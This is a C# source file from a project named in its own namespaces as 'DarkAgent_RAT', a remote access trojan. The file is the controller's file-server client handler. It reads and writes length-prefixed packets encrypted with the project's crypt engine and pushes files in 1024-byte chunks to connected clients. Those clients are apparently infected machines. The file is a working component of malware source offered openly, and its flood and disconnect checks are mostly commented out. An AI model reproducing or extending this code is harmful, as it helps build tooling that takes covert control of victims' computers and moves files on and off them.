using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Objects;
using DarkAgent_RAT.src.Network.FileServer.Packets;
using DarkAgent_RAT.src.Network.FileServer.Packets.Send;
using DarkAgent_RAT.src.Engines;
using DarkAgent_RAT.src.Utils;
using System.IO;
using DarkAgent_RAT.src.Events;

//credits DragonHunter

namespace DarkAgent_RAT.src.Network.FileServer
{
    public class FileClients
    {
        public delegate void DisconnectHandler(FileClients client);
        private Socket _socket;
        private byte[] _buffer;
        public DisconnectHandler DisconnectHandle {get;set;}
        private FloodProtector _FloodProtector;
        public int ClientID;
        public SortedList<short, FileTransfer> _FileTransfer;
        public int NetworkKey;

        public FileClients(Socket socket, int key)
        {
            _socket = socket;
            NetworkKey = key;
            _FloodProtector = new FloodProtector(2000, 1000);

            //Lets send to the client first our socket info :P
            SendPacket(new S_RemoteIP(this));

            Read();
            _FileTransfer = new SortedList<short, FileTransfer>();
        }

        private void Read()
        {
            //Read first 2 bytes of the packet, this contains the size.
            _buffer = new byte[2];
            try { _socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.Partial, new AsyncCallback(ReadCallbackStatic), null); } catch {}
        }

        private void ReadCallbackStatic(IAsyncResult ar)
        {
            try
            {
                if (_socket.EndReceive(ar) > 1)
                {
                    if (_FloodProtector.HandleFlood(_socket.RemoteEndPoint) == false)
                    {
                        //Disconnect();
                        //return;
                    }


                    //Get length from the buffer, convert to Int16 and read the rest of the packet.

                    if(_buffer[0] == 0 && _buffer[1] == 0)
                    {
                        Read();
                        return;
                    }

                    try
                    {
                        _buffer = new byte[BitConverter.ToInt16(_buffer, 0) - 2];
                    }
                    catch
                    {
                        //Sometimes here is a error because the first 2 bytes are '0'
                        //I really don't know how to fix that... so lets ignore it :P
                    }

                    if (_buffer.Length > 0)
                    {
                        settings.ReceivedPackets++;
                        _socket.Receive(_buffer, _buffer.Length, SocketFlags.Partial);
                        _buffer = CryptEngine.Crypt(_buffer, NetworkKey);
                        Type pck = FileClientPacketProcessor.ProcessPacket(_buffer, _socket.RemoteEndPoint.ToString());
                        if (pck != null)
                        {
                            ReceiveBasePacket rbp = (ReceiveBasePacket)Activator.CreateInstance(pck, this, _buffer);
                            rbp.Run();
                        }
                        else
                        {
                            //unknown packet received
                            //Disconnect();
                            Read();
                            return;
                        }

                        Read();
                        return;
                    }
                    else
                    {
                        //Disconnect when no length is given... maybe flood? just disconnect :P
                        //Disconnect();
                        Read();
                        return;
                    }
                }
                else
                {
                    //Disconnect();
                    Read();
                    return;
                }
            }
            catch
            {
                //if(!_socket.Connected)
                //    Disconnect();
                Read();
                return;
            }
        }

        public void SendPacket(SendBasePacket packet)
        {
            lock(this)
            {
                packet.Write();

                if (packet.Length > 60000)
                    return;

                byte[] pck = packet.ToByteArray();
                byte PacketId = pck[0];
                pck = CryptEngine.Crypt(pck, NetworkKey);

                List<Byte> FullPacket = new List<Byte>();
                FullPacket.AddRange(BitConverter.GetBytes((short)(pck.Length + 2))); //+2 Packet Length
                FullPacket.AddRange(pck);
                try { _socket.Send(FullPacket.ToArray()); } catch { }
                settings.SendedPackets++;
            }
        }

        public void SendFile(FileTransfer info, byte[] FileBytes, S_FileTransferSendBegin.SendType type)
        {
            SendPacket(new S_FileTransferSendBegin(this, info, type));
            Thread thread = new Thread(new ParameterizedThreadStart(ThreadSendFile));
            thread.Start(new object[] { info, FileBytes });
        }


        private void ThreadSendFile(object param)
        {
            FileTransfer inf = (FileTransfer)((object[])param)[0];
            byte[] FileBytes = (byte[])((object[])param)[1];
            int Index = 0;

            for (int i = 0; i < FileBytes.Length; i += 1024)
            {
                if (i + 1024 <= FileBytes.Length)
                {
                    byte[] FilePiece = new byte[1024];
                    Array.Copy(FileBytes, i, FilePiece, 0, 1024);
                    SendPacket(new S_FileTransferSend(this, inf, FilePiece, Index));
                }
                else
                {
                    byte[] FilePiece = new byte[FileBytes.Length - i];
                    Array.Copy(FileBytes, i, FilePiece, 0, FileBytes.Length - i);
                    SendPacket(new S_FileTransferSend(this, inf, FilePiece, Index));
                }
                Index++;
            }
            SendPacket(new S_FileTransferSendComplete(this, inf));
        }

        private void Disconnect()
        {
            ClientDisconnectEventArgs e1 = new ClientDisconnectEventArgs(_socket.RemoteEndPoint.ToString());
            ClientDisconnectEvent.OnClientDisconnect(e1);

            settings.ClientsConnected--;
            Logger.AddLog(new LogInfo("Client disconnected", _socket.RemoteEndPoint.ToString().Split(':')[0]));

            _socket.Disconnect(false);
            if (DisconnectHandle != null) DisconnectHandle(this);
            MaxConnections.Disconnect(_socket.RemoteEndPoint);
        }

        public IPEndPoint RemoteEndPoint
        {
            get { return (IPEndPoint)_socket.RemoteEndPoint; }
        }
    }
}
